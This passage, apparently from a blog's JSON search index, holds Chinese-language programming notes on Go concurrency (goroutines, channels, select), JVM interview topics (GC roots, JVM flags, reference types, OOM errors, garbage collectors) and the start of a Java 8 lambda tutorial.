r)) } }() a := 1 b := 0 fmt.Println(a / b) // runtime error: integer divide by zero // panic(errors.New(&quot;this is an error&quot;)) // panic(123) // 如果不是一个错误的话就, 再次 panic 出去}func main() { tryRecover() } 并发编程goroutine1、协程 轻量级“线程” 非抢占式多任务处理，由协程主动交出控制权 编译器/解释器/虚拟器层面的多任务 多个协程可能在一个或者多个线程上运行 package mainimport ( &quot;fmt&quot; &quot;time&quot;)func test() { // 此时, 不会输出, main 先退出了, 必须让 main sleep for i := 0; i &lt; 1000; i++ { // 匿名函数 go func(i int) { for { fmt.Printf(&quot;From %d\\n&quot;, i) } }(i) } time.Sleep(time.Millisecond)}func test2() { // 此时不会退出, 因为不能交出控制权 var arr [10]int for i := 0; i &lt; 10; i++ { // 匿名函数 go func(i int) { arr[i]++ }(i) } time.Sleep(time.Millisecond)}func main() { test() test2()} 2、go 语言中的调度器 协程可以相互通信 channelchannel是goroutine之间互相通讯的东西。类似我们 Unix 上的管道（可以在进程间传递消息），用来goroutine之间发消息和接收消息。其实，就是在做goroutine之间的内存共享。channel是类型相关的，也就是说一个channel只能传递一种类型的值，这个类型需要在channel声明时指定。 package mainimport ( &quot;fmt&quot; &quot;time&quot;)// 定义chanfunc defineChan() { // 声名一个传递int型的channel // var a chan int // 初始化一个int型channel a := make(chan int) // 从channel中获取 go func() { for { z := &lt;-a fmt.Println(z) } }() a &lt;- 1 time.Sleep(time.Millisecond)}// 定义带缓存chanfunc bufChan() { // 初始化一个int型channel a := make(chan int, 3) // 从channel中获取 go func() { for { //z, ok := &lt;-a //if !ok { // break //} //fmt.Println(z) // 或者使用这种, 确保发送完成 for z := range a { fmt.Println(z) } } }() a &lt;- 1 a &lt;- 2 a &lt;- 3 a &lt;- 4 close(a) // 关闭了的话, 就一直发送0 time.Sleep(time.Millisecond)}// 如何使用func chanDemo() { // 定义一个只能收数据的channel, 把数据放到channel中 var channels [10]chan&lt;- int for i := 0; i &lt; len(channels); i++ { channels[i] = createWorker(i) } // 向channel中写数据 for i := 0; i &lt; len(channels); i++ { channels[i] &lt;- 'a' + i } time.Sleep(time.Millisecond)}func createWorker(i int) chan&lt;- int { c := make(chan int) go func() { for { fmt.Printf(&quot;Worker %d received %c\\n&quot;, i, &lt;-c) } }() return c}func main() { defineChan() bufChan() chanDemo()} 使用 Channel 等待任务结束package mainimport ( &quot;fmt&quot;)type worker struct { in chan int done chan bool // 使用done来通信确定完成}func chanDemo() { var channels [10]worker for i := 0; i &lt; len(channels); i++ { channels[i] = createWorker(i) } // 向channel中写数据 for i := 0; i &lt; len(channels); i++ { channels[i].in &lt;- 'a' + i &lt;-channels[i].done // 等待channel完成 }}func createWorker(i int) worker { w := worker{ in: make(chan int), done: make(chan bool), } go func() { for in := range w.in { fmt.Printf(&quot;Worker %d received %c\\n&quot;, i, in) w.done &lt;- true } }() return w}func main() { chanDemo()} 使用 select 进行调度package mainimport ( &quot;fmt&quot; &quot;math/rand&quot; &quot;time&quot;)func selectDemo() { var c1, c2 chan int c1, c2 = createChan(), createChan() for { select { case n := &lt;-c1: fmt.Printf(&quot;from c1, val: %d\\n&quot;, n) case n := &lt;-c2: fmt.Printf(&quot;from c2, val: %d\\n&quot;, n) } }}func createChan() chan int { out := make(chan int) go func() { i := 0 for { time.Sleep(time.Duration(rand.Intn(1000)) * time.Millisecond) i++ out &lt;- i } }() return out}func main() { selectDemo()}","link":"/2019/10/11/Go%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/"},{"title":"JVM 面试","text":"JVM 垃圾回收的时候如何确定垃圾？知道什么是 GC Roots ? 什么是垃圾 简单来说就是内存中已经不在被使用到的空间就是垃圾 要进行垃圾回收，如何判断一个对象是否可以被回收？ 引用计数法 枚举根节点做可达性分析 为了解决引用计数法的循环引用问题，Java 使用了可达性算法。 跟踪收集器采用的为集中式的管理方式，全局记录对象之间的引用状态，执行时从一些列GC Roots的对象做为起点，从这些节点向下开始进行搜索所有的引用链，当一个对象到GC Roots 没有任何引用链时，则证明此对象是不可用的。 图中，对象Object6、Object7、Object8虽然互相引用，但他们的GC Roots是不可到达的，所以它们将会被判定为是可回收的对象。 哪些对象可以作为 GC Roots 的对象： 虚拟机栈（栈帧中的局部变量区，也叫局部变量表）中引用的对象 方法区中的类静态属性引用的对象 方法去常量引用的对象 本地方法栈中 JNI (Native方法)引用的对象 你说你做过 JVM 调优和参数配置，请问如果盘点查看 JVM 系统默认值？JVM 的参数类型: 标配参数 -version -help X 参数（了解） -Xint：解释执行 -Xcomp：第一次使用就编译成本地代码 -Xmixed：混合模式 XX 参数 Boolean 类型：-XX：+ 或者 - 某个属性值（+ 表示开启，- 表示关闭） -XX:+PrintGCDetails：打印 GC 收集细节 -XX:-PrintGCDetails：不打印 GC 收集细节 -XX:+UseSerialGC：使用了串行收集器 -XX:-UseSerialGC：不使用了串行收集器 KV 设置类型：-XX:key=value -XX:MetaspaceSize=128m -XX:MaxTenuringThreshold=15 jinfo 举例，如何查看当前运行程序的配置 public class HelloGC { public static void main(String[] args) { System.out.println(&quot;hello GC...&quot;); try { Thread.sleep(Integer.MAX_VALUE); } catch (InterruptedException e) { e.printStackTrace(); } }} 我们可以使用 jps -l 命令，查出进程 id 1923 org.jetbrains.jps.cmdline.Launcher1988 sun.tools.jps.Jps1173 org.jetbrains.kotlin.daemon.KotlinCompileDaemon32077 com.intellij.idea.Main1933 com.cuzz.jvm.HelloGC32382 org.jetbrains.idea.maven.server.RemoteMavenServer 在使用 jinfo -flag PrintGCDetails 1933 命令查看 -XX:-PrintGCDetails 可以看出默认是不打印 GC 收集细节也可是使用jinfo -flags 1933 查看所以的参数 两个经典参数：-Xms 和 - Xmx（如 -Xms1024m） -Xms 等价于 -XX:InitialHeapSize -Xmx 等价于 -XX:MaxHeapSize 盘点家底查看 JVM 默认值 查看初始默认值：-XX:+PrintFlagsInitialcuzz@cuzz-pc:~/Project/demo$ java -XX:+PrintFlagsInitial[Global flags] intx ActiveProcessorCount = -1 {product} uintx AdaptiveSizeDecrementScaleFactor = 4 {product} uintx AdaptiveSizeMajorGCDecayTimeScale = 10 {product} uintx AdaptiveSizePausePolicy = 0 {product} uintx AdaptiveSizePolicyCollectionCostMargin = 50 {product} uintx AdaptiveSizePolicyInitializingSteps = 20 {product} uintx AdaptiveSizePolicyOutputInterval = 0 {product} uintx AdaptiveSizePolicyWeight = 10 {product} ... 查看修改更新：-XX:+PrintFlagsFinalbool UsePSAdaptiveSurvivorSizePolicy = true {product}bool UseParNewGC = false {product}bool UseParallelGC := true {product}bool UseParallelOldGC = true {product}bool UsePerfData = true {product}bool UsePopCountInstruction = true {product}bool UseRDPCForConstantTableBase = false {C2 product} = 与 := 的区别是，一个是默认，一个是人物改变或者 jvm 加载时改变的参数 打印命令行参数(可以看默认垃圾回收器)：-XX:+PrintCommandLineFlagscuzz@cuzz-pc:~/Project/demo$ java -XX:+PrintCommandLineFlags-XX:InitialHeapSize=128789376 -XX:MaxHeapSize=2060630016 -XX:+PrintCommandLineFlags -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC 你平时工作用过的 JVM 常用的基本配置参数有哪些？ -Xms 初始大小内存，默认为物理内存 1/64 等价于 -XX:InitialHeapSize -Xmx 最大分配内存，默认为物理内存的 1/4 等价于 -XX:MaxHeapSize -Xss 设置单个线程栈的大小，一般默认为 512-1024k 等价于 -XX:ThreadStackSize -Xmn 设置年轻代的大小 整个JVM内存大小=年轻代大小 + 年老代大小 + 持久代大小，持久代一般固定大小为64m，所以增大年轻代后，将会减小年老代大小。此值对系统性能影响较大，Sun官方推荐配置为整个堆的3/8。 -XX:MetaspaceSize 设置元空间大小（元空间的本质和永久代类似，都是对 JVM 规范中的方法区的实现，不过元空间于永久代之间最大区别在于，元空间并不在虚拟中，而是使用本地内存，因此默认情况下，元空间的大小仅受本地内存限制） 元空间默认比较小，我们可以调大一点 -XX:+PrintGCDetails 输出详细 GC 收集日志信息 设置 JVM 参数为： -Xms10m -Xmx10m -XX:+PrintGCDetails -XX:SurvivorRatio 设置新生代中 eden 和 S0/S1 空间比例 默认 -XX:SurvivorRatio=8，Eden : S0 : S1 = 8 : 1 : 1 -XX:NewRatio 配置年轻代和老年代在堆结构的占比 默认 -XX:NewRatio=2 新生代占1，老年代占2，年轻代占整个堆的 1/3 -XX:MaxTenuringThreshold 设置垃圾最大年龄 强引用、软引用、弱引用和虚引用分别是什么？在Java语言中，除了基本数据类型外，其他的都是指向各类对象的对象引用；Java中根据其生命周期的长短，将引用分为4类。 强引用 我们平常典型编码Object obj = new Object()中的 obj 就是强引用，通过关键字new创建的对象所关联的引用就是强引用。 当JVM内存空间不足，JVM宁愿抛出 OutOfMemoryError 运行时错误（OOM），使程序异常终止，也不会靠随意回收具有强引用的“存活”对象来解决内存不足的问题。 对于一个普通的对象，如果没有其他的引用关系，只要超过了引用的作用域或者显式地将相应强引用赋值为 null，就是可以被垃圾收集的了，具体回收时机还是要看垃圾收集策略。 软引用 软引用通过SoftReference类实现， 软引用的生命周期比强引用短一些。 只有当 JVM 认为内存不足时，才会去试图回收软引用指向的对象：即 JVM 会确保在抛出 OutOfMemoryError 之前，清理软引用指向的对象。 软引用可以和一个引用队列（ReferenceQueue）联合使用，如果软引用所引用的对象被垃圾回收器回收，Java虚拟机就会把这个软引用加入到与之关联的引用队列中。后续，我们可以调用ReferenceQueue的poll()方法来检查是否有它所关心的对象被回收。如果队列为空，将返回一个null，否则该方法返回队列中前面的一个Reference对象。 应用场景：软引用通常用来实现内存敏感的缓存。如果还有空闲内存，就可以暂时保留缓存，当内存不足时清理掉，这样就保证了使用缓存的同时，不会耗尽内存。 代码验证，我设置 JVM 参数为 -Xms10m -Xmx10m -XX:+PrintGCDetails public class SoftReferenceDemo { public static void main(String[] args) { Object obj = new Object(); SoftReference&lt;Object&gt; softReference = new SoftReference&lt;&gt;(obj); obj = null; try { // 分配 20 M byte[] bytes = new byte[20 * 1024 * 1024]; } catch (Exception e) { e.printStackTrace(); } finally { System.out.println(&quot;软引用：&quot; + softReference.get()); } }} 发现当内存不够的时候就会被回收。 [GC (Allocation Failure) [PSYoungGen: 1234K-&gt;448K(2560K)] 1234K-&gt;456K(9728K), 0.0016748 secs] [Times: user=0.00 sys=0.00, real=0.01 secs] [GC (Allocation Failure) [PSYoungGen: 448K-&gt;384K(2560K)] 456K-&gt;392K(9728K), 0.0018398 secs] [Times: user=0.01 sys=0.00, real=0.00 secs] [Full GC (Allocation Failure) [PSYoungGen: 384K-&gt;0K(2560K)] [ParOldGen: 8K-&gt;358K(7168K)] 392K-&gt;358K(9728K), [Metaspace: 3030K-&gt;3030K(1056768K)], 0.0057246 secs] [Times: user=0.01 sys=0.00, real=0.01 secs] [GC (Allocation Failure) [PSYoungGen: 0K-&gt;0K(2560K)] 358K-&gt;358K(9728K), 0.0006038 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] [Full GC (Allocation Failure) [PSYoungGen: 0K-&gt;0K(2560K)] [ParOldGen: 358K-&gt;340K(7168K)] 358K-&gt;340K(9728K), [Metaspace: 3030K-&gt;3030K(1056768K)], 0.0115080 secs] [Times: user=0.01 sys=0.00, real=0.01 secs] 软引用：nullException in thread &quot;main&quot; java.lang.OutOfMemoryError: Java heap space at com.cuzz.jvm.SoftReferenceDemo.main(SoftReferenceDemo.java:21)Heap PSYoungGen total 2560K, used 98K [0x00000000ffd00000, 0x0000000100000000, 0x0000000100000000) eden space 2048K, 4% used [0x00000000ffd00000,0x00000000ffd18978,0x00000000fff00000) from space 512K, 0% used [0x00000000fff00000,0x00000000fff00000,0x00000000fff80000) to space 512K, 0% used [0x00000000fff80000,0x00000000fff80000,0x0000000100000000) ParOldGen total 7168K, used 340K [0x00000000ff600000, 0x00000000ffd00000, 0x00000000ffd00000) object space 7168K, 4% used [0x00000000ff600000,0x00000000ff6552f8,0x00000000ffd00000) Metaspace used 3067K, capacity 4496K, committed 4864K, reserved 1056768K class space used 336K, capacity 388K, committed 512K, reserved 1048576K 弱引用 弱引用通过 WeakReference 类实现， 弱引用的生命周期比软引用短。 在垃圾回收器线程扫描它所管辖的内存区域的过程中，一旦发现了具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。由于垃圾回收器是一个优先级很低的线程，因此不一定会很快回收弱引用的对象。 弱引用可以和一个引用队列（ReferenceQueue）联合使用，如果弱引用所引用的对象被垃圾回收，Java虚拟机就会把这个弱引用加入到与之关联的引用队列中。 应用场景：弱应用同样可用于内存敏感的缓存。 代码验证 public class WeakReferenceDemo { public static void main(String[] args) { Object obj = new Object(); WeakReference&lt;Object&gt; weakReference = new WeakReference&lt;&gt;(obj); System.out.println(obj); System.out.println(weakReference.get()); obj = null; System.gc(); System.out.println(&quot;GC之后....&quot;); System.out.println(obj); System.out.println(weakReference.get()); }} 输出 java.lang.Object@1540e19djava.lang.Object@1540e19dGC之后....nullnull 引用队列 public class ReferenceQueueDemo { public static void main(String[] args) throws InterruptedException { Object obj = new Object(); ReferenceQueue&lt;Object&gt; referenceQueue = new ReferenceQueue&lt;&gt;(); WeakReference&lt;Object&gt; weakReference = new WeakReference&lt;&gt;(obj, referenceQueue); System.out.println(obj); System.out.println(weakReference.get()); System.out.println(weakReference); obj = null; System.gc(); Thread.sleep(500); System.out.println(&quot;GC之后....&quot;); System.out.println(obj); System.out.println(weakReference.get()); System.out.println(weakReference); }} 会把该对象的包装类即weakReference放入到ReferenceQueue里面，我们可以从queue中获取到相应的对象信息，同时进行额外的处理。比如反向操作，数据清理等。 java.lang.Object@1540e19djava.lang.Object@1540e19djava.lang.ref.WeakReference@677327b6GC之后....nullnulljava.lang.ref.WeakReference@677327b6 虚引用 虚引用也叫幻象引用，通过PhantomReference类来实现，无法通过虚引用访问对象的任何属性或函数。 幻象引用仅仅是提供了一种确保对象被 finalize 以后，做某些事情的机制。 如果一个对象仅持有虚引用，那么它就和没有任何引用一样，在任何时候都可能被垃圾回收器回收。 虚引用必须和引用队列 （ReferenceQueue）联合使用。当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会在回收对象的内存之前，把这个虚引用加入到与之关联的引用队列中。 ReferenceQueue queue = new ReferenceQueue ();PhantomReference pr = new PhantomReference (object, queue); 程序可以通过判断引用队列中是否已经加入了虚引用，来了解被引用的对象是否将要被垃圾回收。如果程序发现某个虚引用已经被加入到引用队列，那么就可以在所引用的对象的内存被回收之前采取一些程序行动。 应用场景：可用来跟踪对象被垃圾回收器回收的活动，当一个虚引用关联的对象被垃圾收集器回收之前会收到一条系统通知。 请谈谈你对 OOM 的认识？ java.lang.StackOverflowError 在一个函数中调用自己就会产生这个错误 java.lang.OutOfMemoryError : Java heap space new 一个很大对象 java.lang.OutOfMemoryError : GC overhead limit exceeded 执行垃圾收集的时间比例太大， 有效的运算量太小，默认情况下,，如果GC花费的时间超过 **98%**， 并且GC回收的内存少于 **2%**， JVM就会抛出这个错误。 java.lang.OutOfMemoryError : Direct buffer memory配置参数：-Xms10m -Xmx10m -XX:+PrintGCDetails -XX:MaxDirectMemorySize=5m public class DirectBufferDemo { public static void main(String[] args) { System.out.println(&quot;maxDirectMemory : &quot; + sun.misc.VM.maxDirectMemory() / (1024 * 1024) + &quot;MB&quot;); ByteBuffer byteBuffer = ByteBuffer.allocateDirect(6 * 1024 * 1024); }} 输出 maxDirectMemory : 5MB[GC (System.gc()) [PSYoungGen: 1315K-&gt;464K(2560K)] 1315K-&gt;472K(9728K), 0.0008907 secs] [Times: user=0.00 sys=0.00, real=0.01 secs] [Full GC (System.gc()) [PSYoungGen: 464K-&gt;0K(2560K)] [ParOldGen: 8K-&gt;359K(7168K)] 472K-&gt;359K(9728K), [Metaspace: 3037K-&gt;3037K(1056768K)], 0.0060466 secs] [Times: user=0.01 sys=0.00, real=0.00 secs] Exception in thread &quot;main&quot; java.lang.OutOfMemoryError: Direct buffer memory at java.nio.Bits.reserveMemory(Bits.java:694) at java.nio.DirectByteBuffer.&lt;init&gt;(DirectByteBuffer.java:123) at java.nio.ByteBuffer.allocateDirect(ByteBuffer.java:311) at com.cuzz.jvm.DirectBufferDemo.main(DirectBufferDemo.java:17)Heap PSYoungGen total 2560K, used 56K [0x00000000ffd00000, 0x0000000100000000, 0x0000000100000000) eden space 2048K, 2% used [0x00000000ffd00000,0x00000000ffd0e170,0x00000000fff00000) from space 512K, 0% used [0x00000000fff00000,0x00000000fff00000,0x00000000fff80000) to space 512K, 0% used [0x00000000fff80000,0x00000000fff80000,0x0000000100000000) ParOldGen total 7168K, used 359K [0x00000000ff600000, 0x00000000ffd00000, 0x00000000ffd00000) object space 7168K, 5% used [0x00000000ff600000,0x00000000ff659e28,0x00000000ffd00000) Metaspace used 3068K, capacity 4496K, committed 4864K, reserved 1056768K class space used 336K, capacity 388K, committed 512K, reserved 1048576K java.lang.OutOfMemoryError : unable to create new native thread 创建线程数太多了 java.lang.OutOfMemoryError : Metaspace Java 8 之后的版本使用元空间（Metaspace）代替了永久代，元空间是方法区在 HotSpot 中的实现，它与持久代最大的区别是：元空间并不在虚拟机中的内存中而是使用本地内存。 元空间存放的信息： 虚拟机加载的类信息 常量池 静态变量 即时编译后的代码 具体的实现可以看看这个帖子：几种手动OOM的方式 GC 垃圾回收算法和垃圾收集器的关系？谈谈你的理解？ 四种 GC 垃圾回收算法 引用计数 复制回收 标记清除 标记整理 GC 算法是内存回收的方法论，垃圾收集其就是算法的落实的实现。 目前为止还没有完美的收集器的出现，更加没有万能的收集器，只是针对具体应用最适合的收集器，进行分代收集。 串行垃圾回收器（Serial） 它为单线程环境设计且只使用一个线程进行垃圾回收，会暂停所有的用户线程，所以不适合服务环境。 并行垃圾回收器（Parallel） 多个垃圾收集线程并行工作，此时用户线程是暂停的，用于科学计算、大数据处理等弱交互场景。 并发垃圾回收器（CMS） 用户线程和垃圾收集线程同时执行（不一定是并行，可能是交替执行），不需要停顿用户线程，互联网公司多用它，适用对相应时间有要求的场景。 G1 垃圾回收器 G1 垃圾回收器将堆内存分割成不同的区域然后并发的对其进行垃圾回收。 怎么查看服务器默认垃圾收集器是哪个？生产是如何配置垃圾收集器？谈谈你对垃圾收集器的理解？ 怎么查看服务器默认垃圾收集器是哪个？ Java -XX:+PrintCommandLineFlags Java 的 GC 回收的类型主要有： UseSerialGC，UseParallelGC，UseConcMarkSweepGC，UseParNewGC，UseParallelOldGC，UseG1GC Java 8 以后基本不使用 Serial Old 垃圾收集器 参数说明 DefNew : Default New Generation Tenured : Old ParNew : Parallel New Generation PSYoungGen : Parallel Scavenge ParOldGen : Parallel Old Generation Server/Client 模式分别是什么意思 最主要的差别在于：-Server模式启动时，速度较慢，但是一旦运行起来后，性能将会有很大的提升。 当虚拟机运行在-client模式的时候，使用的是一个代号为C1的轻量级编译器, 而-server模式启动的虚拟机采用相对重量级，代号为C2的编译器，C2比C1编译器编译的相对彻底，服务起来之后,性能更高。 所以通常用于做服务器的时候我们用服务端模式，如果你的电脑只是运行一下java程序，就客户端模式就可以了。当然这些都是我们做程序优化程序才需要这些东西的，普通人并不关注这些专业的东西了。其实服务器模式即使编译更彻底，然后垃圾回收优化更好，这当然吃的内存要多点相对于客户端模式。 新生代 串行 GC (Serial/ Serital Copying) 并行 GC (ParNew) 并行回收 GC (Parallel/ Parallel Scanvenge) 老年代 串行 GC (Serial Old/ Serial MSC) 并行 GC (Parallel Old/ Parallel MSC) 并发标记清除 GC (CMS) 是一种以获取最短回收停顿时间为目标的收集器，适合应用在互联网站或者 B/S 系统的服务器上，这个类应用尤其重视服务器的响应速度，希望系统停顿时间最短。 CMS 非常适合堆内存大、CPU 核数多的服务器端应用，也是 G1 出现之前大型应用首选收集器。 并发停顿比较少，并发指的是与用户线程一起执行。 过程 初始标记（initail mark）：只是标记一下 GC Roots 能直接关联的对象，速度很快，需要暂停所有的工作线程 并发标记（concurrent mark 和用户线程一起）：进行 GC Roots 的跟踪过程，和用户线程一起工作，不需要暂停工作线程。 重新标记（remark）：为了修正在并发标记期间，因用户程序继续运行而导致标记产生变动的那一部分对象的标记记录，仍然需要暂停所有的工作线程。 并发清除（concurrent sweep 和用户线程一起）：清除 GC 不可达对象，和用户线程一起工作，不需要暂停工作线程，基于标记结果，直接清除。由于耗时最长的并发标记和并发清除过程中，垃圾收集线程和用户线程可以一起并发工作，所以总体来看 CMS 收集器的内存回收和用户线程是一起并发地执行。 优缺点 优点：并发收集停顿低 缺点：并发执行对 CPU 资源压力大，采用的标记清除算法会导致大量碎片 由于并发进行， CMS 在收集与应用线程会同时增加对堆内存的占用，也就是说，CMS 必须要在老年代堆用尽之前完成垃圾回收，否者 CMS 回收失败，将触发担保机制，串行老年代收集器将会以 STW 的方式进行一次 GC，从而造成较大的停顿时间。 标记清除算法无法整理空间碎片，老年代空间会随着应用时长被逐渐耗尽，最后将不得不通过担保机制对堆内存进行压缩。CMS 也提供了参数 -XX:CMSFullGCsBeForeCompaction (默认0，即每次都进行内存整理) 来指定多少次 CMS 收集之后，进行一次压 垃圾收集器配置代码总结，配置新生代收集器，老年代收集器会自动配置上。 如何选择垃圾收集器 单 CPU 或者小内存，单机程序：-XX:UseSerialGC 多 CPU 需要最大吞吐量，如后台计算型应用：-XX:UseParallelGC 或者 -XX:UseParallelOldGC 多 CPU 追求低停顿时间，需要快速响应，如互联网应用：-XX:+UseConcMarkSweepGC G1 垃圾收集器你了解吗？以前收集器的特点 年轻代和老年代是各自独立且连续的内存块 年轻代收集器使用 eden + S0 + S1 进行复制算法 老年代收集必须扫描整个老年代区域 都是以尽可能的少而快速地执行 GC 为设计原则 G1 是什么 G1 是一种面向服务端的垃圾收集器，应用在多核处理器和大容量内存环境中，在实现高吞吐量的同时，尽可能的满足垃圾收集器的暂停时间要求。 像 CMS 收集器一样，能与应用程序线程并发执行，整理空闲空间更快，需要更多的时间来预测 GC 停顿时间，不希望牺牲大量的吞吐性能，不需要更大的 JAVA Heap。 G1 收集器的设计目的是取代 CMS 收集器，同时与 CMS 相比，G1 垃圾收集器是一个有整理内存过程的垃圾收集器，不会产生很多内存碎片。G1 的 Stop The World 更可控，G1 在停顿上添加了预测机制，用户可以指定期望的停顿时间。 G1 是在 2012 年才在 jdk.1.7u4 中可以呀用，在 jdk9 中将 G1 变成默认垃圾收集器来代替 CMS。它是以款面向服务应用的收集器。 主要改变是 Eden、Survivor 和 Tenured 等内存区域不再是连续的，而是变成了一个个大小一样的 region，每个 region 从 1M 到 32M 不等，一个 region 有可能属于 Eden、Survivor 或者 Tenured 内存区域。 G1的特点 G1 能充分利用多 CPU、多核环境硬件优势，尽量缩短 STW。 G1 整体采用标记-整理算法，局部是通过是通过复制算法，不会产生内存碎片。 宏观上看 G1 之中不在区分年轻代和老年代，被内存划分为多个独立的子区域。 G1 收集器里面讲整个的内存区域混合在一起，但其本身依然在小范围内要进行年轻代和老年代的区分。保留了新生代和老年代，但她们不在是物理隔离，而是一部分 Region 的集合且不需要 Region 是连续的，也就是说依然会采用不同的 GC 方式来处理不同的区域。 G1 虽然也是分代收集器，但整个内存分区不存在物理上的年轻代和老年代的区别，也不需要完全独立的 Survivor to space 堆做复制准备。G1 只有逻辑上的分代概念，或者说每个分区都可能随 G1 的运行在不同代之间前后切换。 底层原理 Region 区域化垃圾收集器：最大好处是化整为零，避免全内存扫描，只需要按照区域来进行扫描即可。 G1的内存结构和传统的内存空间划分有比较的不同。G1将内存划分成了多个大小相等的Region（默认是512K），Region逻辑上连续，物理内存地址不连续。同时每个Region被标记成E、S、O、H，分别表示Eden、Survivor、Old、Humongous。其中E、S属于年轻代，O与H属于老年代。 H表示Humongous。从字面上就可以理解表示大的对象（下面简称H对象）。当分配的对象大于等于Region大小的一半的时候就会被认为是巨型对象。H对象默认分配在老年代，可以防止GC的时候大对象的内存拷贝。通过如果发现堆内存容不下H对象的时候，会触发一次GC操作。 ** 参看：G1从入门到放弃 生产环境服务器变慢，诊断思路和性能评估谈谈？ 整机：top CPU：vmstat 内存：free 硬盘：df 磁盘IO：iostat 网络IO：ifstat 假如生产环境出现 CPU 过高，请谈谈你的分析思路和定位？ 先用 top 命令找出 CPU 占比最高的 ps -ef 或者 jps 进一步定位，得知是一个怎么样的一个后台程序 定位到具体的线程或代码 ps -mp 11111 -o THREAD,tid,time -m 显示所有的线程 -p 进程使用cpu的时间 -o 该参数后是用户自定义格式 将需要的线程 ID 转化为 16 进制格式 jstat &lt;进程ID&gt; | grep &lt;线程ID(16进制)&gt; -A60 对于 JDK 自带的 JVM 监控和性能分析工具用过哪些？一般机是怎么用到的？下一篇重点介绍。 参考链接 强引用、软引用、弱引用、幻象引用有什么区别？(评论) G1从入门到放弃","link":"/2019/05/10/JVM%E9%9D%A2%E8%AF%95/"},{"title":"Java8的深入与实战","text":"Lambda 表达式和函数式接口 Lambda 表达式定义： Lambda: In programming languages such as Lisp, Python and Ruby lambda is an operator used to denote anonymous functions or closures, following the usage of lambda calculus. 为何需要使用 Lambda 表达式： 在 Java 中，我们无法将函数作为一个参数传递给一个方法，也无法声明一个返回一个函数的方法。 在 JavaScript 中，函数的参数是一个函数，返回值是另一个函数的情况是非常常见的，JavaScript 是一门典型的函数式语言。 我们通过一个例子来引入： /** * @Author: cuzz * @Date: 2019/8/11 14:55 * @Description: */public class Test1 { public static void main(String[] args) { List&lt;Integer&gt; list = Arrays.asList(1, 2, 3, 4, 5, 6); for (int i = 0; i &lt; list.size(); i++) { System.out.println(list.get(i)); } System.out.println(&quot;-----------------&quot;); for (int val : list) { System.out.println(val); } System.out.println(&quot;-----------------&quot;); list.forEach(new Consumer&lt;Integer&gt;() { @Override public void accept(Integer integer) { System.out.println(integer); } }); }} 这是 3 种遍历集合的方式，第一就是简单的遍历，第二种是我们是常说的增强 for 循环遍历。第三种就是 Java 8 新增的方法，先看看 Consumer 这个接口。 package java.util.function;import java.util.Objects;@FunctionalInterfacepublic interface Consumer&lt;T&gt; { void accept(T t); default Consumer&lt;T&gt; andThen(Consumer&lt;? super T&gt; after) { Objects.requireNonNull(after); return (T t) -&gt; { accept(t); after.accept(t); }; }} 注解上是一个函数式接口，我们看看这个接口的作用。 package java.lang;import java.lang.annotation.*;/** * An informative annotation type used to indicate that an interface * type declaration is intended to be a &lt;i&gt;functional interface&lt;/i&gt; as * defined by the Java Language Specification. * * Conceptually, a functional interface has exactly one abstract * method. Since {@linkplain java.lang.reflect.Method#isDefault() * default methods} have an implementation, they are not abstract. If * an interface declares an abstract method overriding one of the * public methods of {@code java.lang.Object}, that also does * &lt;em&gt;not&lt;/em&gt; count toward the interface's abstract method count * since any implementation of the interface will have an * implementation from {@code java.lang.Object} or elsewhere. * * 有且只有一个抽象方法的接口，如果有重写 Object 中的方法，那也是可以的。 * * &lt;p&gt;Note that instances of functional interfaces can be created with * lambda expressions, method references, or constructor references. * * 函数式接口可以通过 lambda 表达式、方法引用和构造方法引用来创建。 * * &lt;p&gt;If a type is annotated with this annotation type, compilers are * required to generate an error message unless: * * &lt;ul&gt; * &lt;li&gt; The type is an interface type and not an annotation type, enum, or class. * &lt;li&gt; The annotated type satisfies the requirements of a functional interface. * &lt;/ul&gt; * * &lt;p&gt;However, the compiler will treat any interface meeting the * definition of a functional interface as a functional interface * regardless of whether or not a {@code FunctionalInterface} * annotation is present on the interface declaration. * * 编译器会对满足定义函数式接口的接口当做函数式接口，不管它有没有 @FunctionalInterface 注解声明。 * * @jls 4.3.2. The Class Object * @jls 9.8 Functional Interfaces * @jls 9.4.3 Interface Method Body * @since 1.8 */@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.TYPE)public @interface FunctionalInterface {} 函数式接口可以通过 lambda 表达式、方法引用和构造方法引用来创建。 lambda 表达式：() -&gt; System.out.println(i) 方法引用：System.out::print 构造方法引用：new::ArrayList 用一个例子来说明什么是函数式接口。 @FunctionalInterfaceinterface Cons { void print(); String toString();}/** * @Author: cuzz * @Date: 2019/8/11 16:13 * @Description: */public class Test2 { public void test(Cons func) { func.print(); } public static void main(String[] args) { Test2 test2 = new Test2(); test2.test(() -&gt; System.out.println(&quot;xxx&quot;)); Cons func = () -&gt; System.out.println(&quot;yyy&quot;); test2.test(func); System.out.println(func.getClass()); // 输出 class com.cuzz.Test2$$Lambda$2/2074407503 System.out.println(func.getClass().getSuperclass()); // 输出 class java.lang.Object }} 可以说明3点： 函数式接口只有一个非重写 Object 的抽象方法 lambda 表达式就是一个匿名类 对于一个函数式接口，我们并不关心这个抽象方法的名称。 从Consumer深入理解函数式接口和方法引用我们回到这个例子当中 public class Test1 { public static void main(String[] args) { list.forEach(new Consumer&lt;Integer&gt;() { @Override public void accept(Integer integer) { System.out.println(integer); } }); }} 先看看 Iterable#forEach 这个方法，是 Iterable 这个接口这的默认方法，在 Java 8 中接口中是允许默认方法。对于 Iterable#forEach 是对每个元素执行给定的动作。 public interface Iterable&lt;T&gt; { /** * Returns an iterator over elements of type {@code T}. * * @return an Iterator. */ Iterator&lt;T&gt; iterator(); /** * Performs the given action for each element of the {@code Iterable} * until all elements have been processed or the action throws an * exception. Unless otherwise specified by the implementing class, * actions are performed in the order of iteration (if an iteration order * is specified). Exceptions thrown by the action are relayed to the * caller. * * 对每个元素执行给定的动作。 * * @implSpec * &lt;p&gt;The default implementation behaves as if: * &lt;pre&gt;{@code * for (T t : this) * action.accept(t); * }&lt;/pre&gt; * * @param action The action to be performed for each element * @throws NullPointerException if the specified action is null * @since 1.8 */ default void forEach(Consumer&lt;? super T&gt; action) { Objects.requireNonNull(action); for (T t : this) { action.accept(t); } } default Spliterator&lt;T&gt; spliterator() { return Spliterators.spliteratorUnknownSize(iterator(), 0); }} 看看 Consumer 是什么 package java.util.function;import java.util.Objects;/** * Represents an operation that accepts a single input 